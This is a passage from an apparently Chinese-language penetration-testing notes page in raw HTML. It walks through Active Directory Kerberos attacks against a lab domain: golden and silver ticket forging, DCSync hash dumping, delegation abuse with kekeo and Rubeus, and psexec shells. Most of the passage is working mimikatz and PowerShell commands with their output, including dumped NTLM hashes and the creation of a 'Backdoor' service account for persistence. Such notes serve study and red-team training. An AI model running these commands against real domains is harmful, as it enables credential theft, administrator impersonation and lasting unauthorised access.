<span class="title">Ticket</span> : ** <span class="title">Pass</span> <span class="title">The</span> <span class="title">Ticket</span> **</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">PAC</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"> * <span class="title">PAC</span> <span class="title">signed</span></span></span><br><span class="line"><span class="function"> * <span class="title">EncTicketPart</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"> * <span class="title">EncTicketPart</span> <span class="title">encrypted</span></span></span><br><span class="line"><span class="function"> * <span class="title">KrbCred</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Golden</span> <span class="title">ticket</span> <span class="title">for</span> &#x27;<span class="title">administrator</span> @ <span class="title">tt.com</span>&#x27; <span class="title">successfully</span> <span class="title">submitted</span> <span class="title">for</span> <span class="title">current</span> <span class="title">session</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">dir</span> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 的目录</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">2009/07/14  11:20    &lt;<span class="title">DIR</span>&gt;          <span class="title">PerfLogs</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function">2020/08/28  21:54    &lt;<span class="title">DIR</span>&gt;          <span class="title">Users</span></span></span><br><span class="line"><span class="function">2020/08/29  16:06    &lt;<span class="title">DIR</span>&gt;          <span class="title">Windows</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> &quot;<span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">tt.com</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">domain</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">DC</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">administrator</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">user</span> <span class="title">account</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">RDN</span>           : <span class="title">Administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">** <span class="title">SAM</span> <span class="title">ACCOUNT</span> **</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SAM</span> <span class="title">Username</span>         : <span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Account</span> <span class="title">Type</span>         : 30000000 ( <span class="title">USER_OBJECT</span> )</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Account</span> <span class="title">Control</span> : 00000200 ( <span class="title">NORMAL_ACCOUNT</span> )</span></span><br><span class="line"><span class="function"><span class="title">Account</span> <span class="title">expiration</span>   : 1601/1/1 8:00:00</span></span><br><span class="line"><span class="function"><span class="title">Password</span> <span class="title">last</span> <span class="title">change</span> : 2020/8/28 21:26:05</span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">Security</span> <span class="title">ID</span>   : <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270-500</span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">Relative</span> <span class="title">ID</span>   : 500</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Credentials</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Hash</span> <span class="title">NTLM</span>: 30<span class="title">a96699356033b84283b8918a895d67</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">psexec</span> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [版本 6.1.7601]</span></span><br><span class="line"><span class="function">版权所有 (<span class="title">c</span>) 2009 <span class="title">Microsoft</span> <span class="title">Corporation</span>。保留所有权利。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">tt</span>\<span class="title">administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">ipconfig</span></span></span><br><span class="line"><span class="function"><span class="title">Windows</span> <span class="title">IP</span> 配置</span></span><br><span class="line"><span class="function">以太网适配器 本地连接:</span></span><br><span class="line"><span class="function">   连接特定的 <span class="title">DNS</span> 后缀 . . . . . . . :</span></span><br><span class="line"><span class="function">   本地链接 <span class="title">IPv6</span> 地址. . . . . . . . : <span class="title">fe80</span>::9187:2<span class="title">d65:add</span>:476<span class="title">e</span>%11</span></span><br><span class="line"><span class="function">   <span class="title">IPv4</span> 地址 . . . . . . . . . . . . : 192.168.19.8</span></span><br><span class="line"><span class="function">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span></span><br><span class="line"><span class="function">   默认网关. . . . . . . . . . . . . : 192.168.19.2</span></span><br></pre></td></tr></table></figure><h3 id="黄金票据-by-ticket"><a href="#黄金票据-by-ticket" class="headerlink" title="黄金票据(by ticket)"></a>黄金票据(by ticket)</h3><p>非约束委派中提到了，后门类型。给某个账号添加krbtgt/domain.com的委派，从而拥有krbtgt服务的权限。</p><p>而krbtgt服务的权限可以操作域控。参考 <a href="https://xz.aliyun.com/t/2931#toc-3">https://xz.aliyun.com/t/2931#toc-3</a></p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><ul><li><p><strong>注意</strong></p><p>生成可以控制指定计算机的票据，作为持久化后门利用</p><p>可以在非域机器上使用，攻击机使用Win7</p><p>访问资源时，必须使用计算机的域名进行访问，不能使用IP</p><p>通过代理访问内网，则把主机域名的解析写入本地hosts文件</p></li><li><p><strong>条件</strong></p><p>机器hash</p><p>/sid 域ID</p><p>/service参数不同，拥有的权限不同</p><p>/admin参数的用户名不能是存在的</p><table><thead><tr><th align="left">服务类型</th><th align="left">白银票据对应的服务名</th></tr></thead><tbody><tr><td align="left">WMI</td><td align="left">HOST/RPCSS</td></tr><tr><td align="left">PowerShell Remoting</td><td align="left">HOST/HOST</td></tr><tr><td align="left">WinRM</td><td align="left">HOST/HTTP</td></tr><tr><td align="left">Scheduled Tasks</td><td align="left">HOST</td></tr><tr><td align="left">Windows File Share (CIFS)</td><td align="left">CIFS</td></tr><tr><td align="left">LDAP operations including Mimikatz DCSync</td><td align="left">LDAP</td></tr><tr><td align="left">Windows Remote Server Administration Tools</td><td align="left">RPCSS/LDAP/CIFS</td></tr></tbody></table></li><li><p><strong>操作</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">抓hash，这里要用到的是机器名$的hash</span><br><span class="line">mimikatz log privilege::debug sekurlsa::logonpasswords <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">mimikatz &quot;kerberos::golden /domain:tt.com /admin:NoThisUser /sid:S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1881962959</span>-<span class="number">1052950955</span>-<span class="number">462027270</span>  /rc4:f24f37620197dfa92d0c272a6835434d /target:WIN-J341S97EGGH.tt.com /service:CIFS /ptt&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用票据访问其他域机器，还可以使用mimikatz直接同步导出指定用户的hash</span><br><span class="line"><span class="built_in">dir</span> \\域机器名.域名\c$</span><br><span class="line">psexec \\域机器名.域名 <span class="built_in">cmd</span></span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:tt.com /user:administrator&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li><li><p>实践</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">48001</span> (<span class="number">00000000</span>:<span class="number">0000</span>bb81)</span><br><span class="line">Session           : UndefinedLogonType from <span class="number">0</span></span><br><span class="line">User Name         : (null)Logon <span class="built_in">Time</span>        : <span class="number">2020</span>/<span class="number">8</span>/<span class="number">28</span> <span class="number">21</span>:<span class="number">42</span>:<span class="number">44</span></span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">         [<span class="number">00000003</span>] Primary</span><br><span class="line">         * Username : WIN-J341S97EGGH$</span><br><span class="line">         * Domain   : TT</span><br><span class="line">         * NTLM     : f24f37620197dfa92d0c272a6835434d</span><br><span class="line">         * SHA1     : <span class="number">0315</span>eca3a67b73e2bf237e819152dfc883a8ea34</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> &quot;<span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">admin:NoThisUser</span> /<span class="title">sid:S</span>-1-5-21-1881962959-1052</span></span><br><span class="line"><span class="function">950955-462027270  /<span class="title">rc4:f24f37620197dfa92d0c272a6835434d</span> /<span class="title">target:WIN</span>-<span class="title">J341S97EGGH.tt.com</span> /<span class="title">service:CIFS</span> /<span class="title">ptt</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">admin:NoThisUser</span> /<span class="title">sid:S</span>-1-5-21-1881962959-1052950955-4</span></span><br><span class="line"><span class="function">62027270  /<span class="title">rc4:f24f37620197dfa92d0c272a6835434d</span> /<span class="title">target:WIN</span>-<span class="title">J341S97EGGH.tt.com</span> /<span class="title">service:CIFS</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>      : <span class="title">NoThisUser</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span>    : <span class="title">tt.com</span> (<span class="title">TT</span>)</span></span><br><span class="line"><span class="function"><span class="title">SID</span>       : <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Id</span>   : 500</span></span><br><span class="line"><span class="function"><span class="title">Groups</span> <span class="title">Id</span> : *513 512 520 518 519</span></span><br><span class="line"><span class="function"><span class="title">ServiceKey</span>: <span class="title">f24f37620197dfa92d0c272a6835434d</span> - <span class="title">rc4_hmac_nt</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span>   : <span class="title">CIFS</span></span></span><br><span class="line"><span class="function"><span class="title">Target</span>    : <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span></span></span><br><span class="line"><span class="function"><span class="title">Lifetime</span>  : 2020/8/29 16:50:45 ; 2030/8/27 16:50:45 ; 2030/8/27 16:50:45</span></span><br><span class="line"><span class="function">-&gt; <span class="title">Ticket</span> : ** <span class="title">Pass</span> <span class="title">The</span> <span class="title">Ticket</span> **</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">PAC</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"> * <span class="title">PAC</span> <span class="title">signed</span></span></span><br><span class="line"><span class="function"> * <span class="title">EncTicketPart</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"> * <span class="title">EncTicketPart</span> <span class="title">encrypted</span></span></span><br><span class="line"><span class="function"> * <span class="title">KrbCred</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Golden</span> <span class="title">ticket</span> <span class="title">for</span> &#x27;<span class="title">NoThisUser</span> @ <span class="title">tt.com</span>&#x27; <span class="title">successfully</span> <span class="title">submitted</span> <span class="title">for</span> <span class="title">current</span> <span class="title">session</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">exit</span></span></span><br><span class="line"><span class="function"><span class="title">Bye</span>!</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">dir</span> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$</span></span><br><span class="line"><span class="function"> 驱动器 \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 中的卷没有标签。</span></span><br><span class="line"><span class="function"> 卷的序列号是 7<span class="title">E13</span>-549<span class="title">E</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2009/07/14  11:20    &lt;<span class="title">DIR</span>&gt;          <span class="title">PerfLogs</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function">2020/08/28  21:54    &lt;<span class="title">DIR</span>&gt;          <span class="title">Users</span></span></span><br><span class="line"><span class="function">2020/08/29  16:14    &lt;<span class="title">DIR</span>&gt;          <span class="title">Windows</span></span></span><br><span class="line"><span class="function">               0 个文件              0 字节</span></span><br><span class="line"><span class="function">               5 个目录 30,553,542,656 可用字节</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure></li></ul><h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><ul><li><p><strong>效果</strong></p><p>只有服务或者计算机才能设置非约束委派</p><p>当域用户登录具有非约束委派权限的计算机后，票据会保存在对应的计算机上，从而可以导出缓存票据使用</p><p>有域计算机的权限后直接导出，看当前有哪些票据就行了。不用非得挨个去找有非约束委派权限的计算机，因为找到了还要上去提权才能导出票据，再看有哪些权限的票据。这个直接用qs的-q就行了的。</p></li><li><p><strong>条件</strong></p><p>普通域账号密码或域用户权限</p></li><li><p><strong>操作</strong></p></li></ul><p>先找到哪些计算机或服务具有非约束委派权限</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali下自带，需要用户名和密码</span><br><span class="line">ldapsearch -x -H ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span>:<span class="number">389</span> -D &quot;CN=ddh,CN=Users,DC=tt,DC=com&quot; -w Admin123 -b &quot;DC=tt,DC=com&quot; &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">在远程非域计算机上查询需要账号密码</span><br><span class="line">dsquery.exe * -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -p Admin123 -filter &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot;</span><br><span class="line">AdFind.exe -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -up Admin123 -f &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; cn operatingSystem distinguishedName</span><br><span class="line">如果whoami是域用户，则可以不用账号密码</span><br><span class="line">dsquery.exe * -filter &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot;</span><br><span class="line">AdFind.exe -f &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; cn operatingSystem distinguishedName</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200830133802114.png" alt="image-20200830133802114"></p><p>找到计算机后，还要有这台计算机的权限，还需要目标用户（如域管理员）登录过后才能抓到票据。</p><p>导出和使用参考缓存票据的使用。</p><p>还是使用qs进行查询最方便，直接批量跑指定IP，或者所有域计算机（不推荐）。</p><p><img src="/images/image-20200830152214740.png" alt="image-20200830152214740"></p><h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><ul><li><p><strong>效果</strong></p><p>域服务账号/计算机可以去请求其他指定服务的票据，这个得看域管理员给这个服务开了其它哪些服务的权限。</p><p>类似于SSO中不同用户有不同的权限，可以打开不同的网站。 </p></li><li><p><strong>条件</strong></p></li><li><p><strong>操作一（计算机账号具有约束委派权限）</strong></p></li></ul><p>测试环境先直接给3B6这台计算机添加约束委派</p><p><img src="/images/image-20200904165530806.png" alt="image-20200904165530806"></p><p>查找域中的委派关系：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -f <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msDS-AllowedToDelegateTo</span><br><span class="line">dsquery.exe * -filter <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> -<span class="built_in">limit</span> 0 -attr distinguishedName msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure><p>如果有3B6的权限，可直接导出票据，或者有之前的计算机hash，用hash去申请票据。在用票据去申请有委派权限服务的ST</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="built_in">exit</span></span><br><span class="line">kekeo <span class="string">&quot;tgs::s4u /tgt:WIN-V5480N4V3B6<span class="variable">$@krbtgt</span>-TT.COM.kirbi /user:administrator /service:cifs/WIN-J341S97EGGH.tt.com&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::golden /domain:tt.com /admin:NoThisUser /sid:S-1-5-21-1881962959-1052950955-462027270  /rc4:1b190b45caa545358a8b711f69fe6971 /target:WIN-V5480N4V3B6 /service:CIFS /ticket&quot;</span> <span class="built_in">exit</span></span><br><span class="line">kekeo <span class="string">&quot;tgs::s4u /tgt:ticket.kirbi /user:administrator@tt.com /service:cifs/WIN-J341S97EGGH.tt.com&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>导入ST，访问服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug <span class="string">&quot;kerberos::ptt C:\Users\ddh\Desktop\TGS_administrator@TT.COM_WIN-V5480N4V3B6<span class="variable">$@TT</span>.COM.kirbi&quot;</span> <span class="built_in">exit</span></span><br><span class="line">dir \\WIN-J341S97EGGH\c$</span><br></pre></td></tr></table></figure><ul><li><strong>操作二（服务账号具有约束委派权限）</strong></li></ul><p>测试环境先给用户添加约束委派权限（实际情况是目标域的管理员为了维护或使用资源而添加的）：</p><p>特别注意，还需要把普通账号设置为服务账号。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">New-ADUser -Name <span class="string">&quot;Backdoor&quot;</span> -SamAccountName backdoor_svc -UserPrincipalName backdoor_svc@tt.com -ServicePrincipalNames <span class="string">&quot;backdoor/backdoor.tt.com&quot;</span> -AccountPassword (convertto-securestring <span class="string">&quot;Admin123&quot;</span> -asplaintext -force)  -PasswordNeverExpires <span class="variable">$True</span>  -PassThru | Enable-ADAccount</span><br><span class="line"><span class="variable">$user</span> = Get-ADUser backdoor_svc</span><br><span class="line">Set-ADObject <span class="variable">$user</span> -Add @&#123; <span class="string">&quot;msDS-AllowedToDelegateTo&quot;</span> = @(<span class="string">&quot;HOST/WIN-J341S97EGGH.tt.com&quot;</span>) &#125;</span><br><span class="line">Set-ADAccountControl <span class="variable">$user</span> -TrustedToAuthForDelegation <span class="variable">$true</span></span><br></pre></td></tr></table></figure><p>  查找域中的委派关系：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -f <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> cn userPrincipalName distinguishedName msDS-AllowedToDelegateTo</span><br><span class="line">dsquery.exe * -filter <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> -<span class="built_in">limit</span> 0 -attr userPrincipalName distinguishedName msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ddh\Desktop&gt;AdFind.exe -f <span class="string">&quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span> cn userPrincipalName distinguishedName msDS-AllowedToDelegateTo</span><br><span class="line">  </span><br><span class="line">  dn:CN=Backdoor,CN=Users,DC=tt,DC=com</span><br><span class="line">&gt;cn: Backdoor</span><br><span class="line">&gt;distinguishedName: CN=Backdoor,CN=Users,DC=tt,DC=com</span><br><span class="line">&gt;userPrincipalName: backdoor_svc@tt.com</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH.tt.com/tt.com</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH.tt.com</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH.tt.com/TT</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/WIN-J341S97EGGH/TT</span><br></pre></td></tr></table></figure><p>发现backdoor_svc账号拥有cifs/WIN-J341S97EGGH.tt.com服务权限，申请对应服务的ST：</p><p>使用kekeo（失败）:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先申请用户的TGT，如果控制的主机上登录的有backdoor_svc用户，则使用sekurlsa::tickets /<span class="built_in">export</span>导出backdoor_svc的票据也行</span><br><span class="line">kekeo <span class="string">&quot;tgt::ask /user:backdoor_svc /domain:tt.com /NTLM:e45a314c664d40a227f9540121d1a29d&quot;</span> <span class="built_in">exit</span></span><br><span class="line">kekeo <span class="string">&quot;tgt::ask /user:backdoor_svc /domain:tt.com /password:Admin123&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">申请ST</span><br><span class="line">kekeo <span class="string">&quot;tgs::s4u /tgt:TGT_backdoor_svc@TT.COM_krbtgt~tt.com@TT.COM.kirbi /user:administrator@tt.com /service:HOST/WIN-J341S97EGGH.tt.com&quot;</span> <span class="built_in">exit</span></span><br><span class="line">导入ST</span><br><span class="line">mimikatz privilege::debug <span class="string">&quot;kerberos::ptt C:\Users\ddh\Desktop\TGS_administrator@tt.com@TT.COM_backdoor_svc@TT.COM.kirbi&quot;</span> <span class="built_in">exit</span></span><br><span class="line">访问服务</span><br><span class="line">dir \\WIN-J341S97EGGH\c$</span><br></pre></td></tr></table></figure><p>使用getst（成功）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.19.8 -spn cifs&#x2F;WIN-J341S97EGGH.tt.com -impersonate Administrator tt.com&#x2F;backdoor_svc:Admin123</span><br><span class="line">mimikatz privilege::debug &quot;kerberos::ptc C:\Users\ddh\Desktop\Administrator.ccache&quot; exit</span><br></pre></td></tr></table></figure><p>使用Rubeus（成功）:</p>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:backdoor_svc /domain:tt.com /rc4:e45a314c664d40a227f9540121d1a29d /impersonateuser:administrator /msdsspn:cifs/WIN-J341S97EGGH.tt.com /altservice:cifs 